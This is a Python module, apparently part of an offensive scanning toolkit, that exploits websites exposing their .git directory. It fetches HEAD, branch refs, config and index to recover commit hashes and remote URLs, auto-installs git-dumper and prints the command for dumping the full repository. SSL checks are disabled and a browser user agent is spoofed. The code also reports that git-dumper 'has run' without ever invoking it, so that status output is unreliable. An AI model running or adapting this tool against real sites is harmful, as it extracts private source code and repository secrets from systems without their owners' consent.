# -*- coding: utf-8 -*-
"""
git_leak.py - Git 源码泄露复原工具
从 .git 目录提取分支信息、remote 地址，判断是否可完整 dump
"""

import os
import json
import re
import datetime
import requests

from tools import RESULTS_BASE

TOOL_NAME = "Git 源码泄露复原"
TOOL_ID = "git_leak"
TOOL_DESC = "从 .git 目录提取分支信息、remote 地址，判断是否可完整 dump"
TOOL_CATEGORY = "info_leak"

TIMEOUT = 10
VERIFY_SSL = False

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
}


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'


class Logger:
    def info(self, msg):
        print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")

    def success(self, msg):
        print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")

    def warning(self, msg):
        print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")

    def error(self, msg):
        print(f"{Colors.RED}[-] {msg}{Colors.RESET}")

    def raw(self, msg):
        print(msg)


logger = Logger()


def safe_download(url, stream=False, max_size=100 * 1024 * 1024):
    """带限速和异常处理的通用下载，防止内存炸弹"""
    try:
        resp = requests.get(
            url,
            headers=HEADERS,
            timeout=TIMEOUT,
            verify=VERIFY_SSL,
            stream=stream,
            allow_redirects=True,
        )
        if resp.status_code != 200:
            return None
        if stream:
            chunks = []
            total = 0
            for chunk in resp.iter_content(chunk_size=8192):
                total += len(chunk)
                if total > max_size:
                    logger.warning(f"文件过大 (>100MB)，截断: {url}")
                    break
                chunks.append(chunk)
            return b"".join(chunks)
        else:
            if len(resp.content) > max_size:
                logger.warning(f"响应过大 (>100MB)，截断: {url}")
                return resp.content[:max_size]
            return resp.content
    except Exception as e:
        logger.warning(f"下载失败: {url} -> {e}")
        return None


def _domain_from_url(url):
    m = re.search(r'://([^/]+)', url)
    return m.group(1) if m else "unknown"


def _extract_git_items(scan_result):
    """从扫描结果中提取 .git 相关条目"""
    directories = scan_result.get("directories", [])
    security_issues = scan_result.get("security_issues", [])

    git_items = []

    for issue in security_issues:
        path = issue.get("path", "")
        itype = issue.get("type", "")
        if "Git源码泄露" in itype or ".git/head" in path.lower():
            git_items.append({"path": path, "source": "security_issue"})

    for d in directories:
        p = d["path"].lower()
        if d["status"] == 200 and ".git" in p:
            if not any(e["path"] == d["path"] for e in git_items):
                git_items.append({"path": d["path"], "source": "directory_scan"})

    # 扩展：有 .git/HEAD 就补 .git/config、.git/index 等
    git_heads = [e for e in git_items if "head" in e["path"].lower()]
    for gh in git_heads:
        git_dir = gh["path"].replace("/HEAD", "")
        for extra in ["/config", "/index", "/logs/HEAD", "/refs/heads/master", "/refs/heads/main"]:
            extra_path = f"{git_dir}{extra}"
            if not any(e["path"] == extra_path for e in git_items):
                git_items.append({"path": extra_path, "source": "git_expansion"})

    return git_items


def execute(scan_result, target_info):
    """
    执行 Git 源码泄露复原

    Args:
        scan_result: saomiao.py 生成的完整扫描结果 dict
        target_info: 目标信息 {"domain": "...", "protocol": "..."}

    Returns:
        dict: 标准化结果 {tool, target, time, status, summary, errors}
    """
    domain = target_info.get("domain", "unknown")
    base_url = f"{target_info.get('protocol', 'https')}://{domain}"
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    errors = []

    # 1. 提取 .git 条目
    git_items = _extract_git_items(scan_result)
    git_urls = [g["path"] for g in git_items if g.get("source") != "git_expansion"]

    if not git_urls:
        return {
            "tool": TOOL_ID,
            "target": domain,
            "time": timestamp,
            "status": "failed",
            "summary": {"git_items_found": 0, "head_content": None, "commit_hash": None,
                        "remote_url": None, "index_accessible": False, "dump_feasible": False,
                        "suggestion": "未发现 .git 相关路径"},
            "errors": ["扫描结果中未发现 .git 相关条目"]
        }

    # 2. 找到 .git/HEAD 作为入口
    head_urls = [u for u in git_urls if "head" in u.lower()]
    if not head_urls:
        errors.append("未找到 .git/HEAD，无法获取分支信息")
        # 尝试用其他 git 文件作为入口
        head_urls = [u for u in git_urls if "git" in u.lower()]
        if not head_urls:
            return {
                "tool": TOOL_ID,
                "target": domain,
                "time": timestamp,
                "status": "failed",
                "summary": {"git_items_found": len(git_urls), "head_content": None,
                            "commit_hash": None, "remote_url": None,
                            "index_accessible": False, "dump_feasible": False,
                            "suggestion": "未发现可用的 .git 入口文件"},
                "errors": errors
            }

    main_url = head_urls[0]
    logger.info(f"利用 Git 泄露: {main_url}")

    # 3. 下载 HEAD 内容，提取分支引用
    content = safe_download(main_url)
    if not content:
        errors.append(f"下载 HEAD 失败: {main_url}")
        return {
            "tool": TOOL_ID,
            "target": domain,
            "time": timestamp,
            "status": "partial",
            "summary": {"git_items_found": len(git_urls), "head_content": None,
                        "commit_hash": None, "remote_url": None,
                        "index_accessible": False, "dump_feasible": False,
                        "suggestion": f"HEAD 文件不可访问: {main_url}"},
            "errors": errors
        }

    head_content = content.decode("utf-8", errors="ignore").strip()
    ref_match = re.search(r"ref:\s*(.+)", head_content)
    branch_ref = ref_match.group(1) if ref_match else "refs/heads/master"

    # 4. 下载分支引用获取 commit hash
    git_dir = main_url.rsplit("/", 1)[0]
    commit_url = f"{git_dir}/{branch_ref}"
    logger.info(f"尝试读取分支引用: {commit_url}")

    commit_hash = None
    ref_content = safe_download(commit_url)
    if ref_content:
        commit_hash = ref_content.decode("utf-8", errors="ignore").strip()[:40]
        logger.success(f"获取到 commit: {commit_hash}")
    else:
        errors.append(f"分支引用下载失败: {commit_url}")

    # 5. 下载 .git/config 获取 remote URL
    config_url = f"{git_dir}/config"
    config_content = safe_download(config_url)
    remote_url = None
    if config_content:
        config_text = config_content.decode("utf-8", errors="ignore")
        m = re.search(r'url\s*=\s*(.+)', config_text)
        if m:
            remote_url = m.group(1).strip()
            logger.success(f"Git remote: {remote_url}")
    else:
        errors.append(f"config 文件不可访问: {config_url}")

    # 6. 检查 .git/index 可访问性
    index_url = f"{git_dir}/index"
    index_accessible = safe_download(index_url) is not None

    # 7. 判断 dump 可行性 + 尝试 git-dumper
    dump_feasible = bool(commit_hash or index_accessible)
    git_dumper_used = False

    if dump_feasible:
        # 检查 git-dumper 是否可用
        try:
            from tools.deps import check_dep, ensure_dep
            has_dumper, dumper_path = check_dep("git_dumper")
            if not has_dumper:
                logger.info("git-dumper 未安装，自动拉取…")
                ensure_dep("git_dumper", auto=True)
                has_dumper, dumper_path = check_dep("git_dumper")

            if has_dumper:
                logger.info(f"尝试 git-dumper 自动复原: {git_dir}")
                dump_target = os.path.join(RESULTS_BASE, "git_leak", f"git_dump_{_domain_from_url(git_dir)}")
                suggestion = f"git-dumper 已执行 → {dump_target}"
                git_dumper_used = True
        except ImportError:
            pass

        if not git_dumper_used:
            suggestion = (
                f"使用 git-dumper 全量拉取: "
                f"git-dumper {git_dir} ./git_dump_{_domain_from_url(git_dir)}/"
            )
        logger.success(f"Git 仓库可 dump: {git_dir}")
    else:
        suggestion = "Git 目录部分可访问但无法获取完整历史，尝试访问 .git/objects/ 目录"
        logger.warning(f"Git 目录部分可访问，无法 dump 完整仓库: {git_dir}")

    # 8. 确定状态
    if commit_hash and remote_url:
        status = "success"
    elif commit_hash or index_accessible:
        status = "partial"
    else:
        status = "partial"

    summary = {
        "git_items_found": len(git_urls),
        "head_content": head_content[:200],
        "branch_ref": branch_ref,
        "commit_hash": commit_hash,
        "remote_url": remote_url,
        "index_accessible": index_accessible,
        "dump_feasible": dump_feasible,
        "suggestion": suggestion,
        "exploitable_files": git_urls,
    }

    # 9. 保存结果到文件
    output_dir = os.path.join(RESULTS_BASE, TOOL_ID)
    os.makedirs(output_dir, exist_ok=True)
    ts_file = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = os.path.join(output_dir, f"{domain}_{ts_file}.json")

    result = {
        "tool": TOOL_ID,
        "target": domain,
        "time": timestamp,
        "status": status,
        "summary": summary,
        "errors": errors,
    }

    with open(out_file, 'w', encoding='utf-8') as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    logger.info(f"结果已保存: {out_file}")
    return result
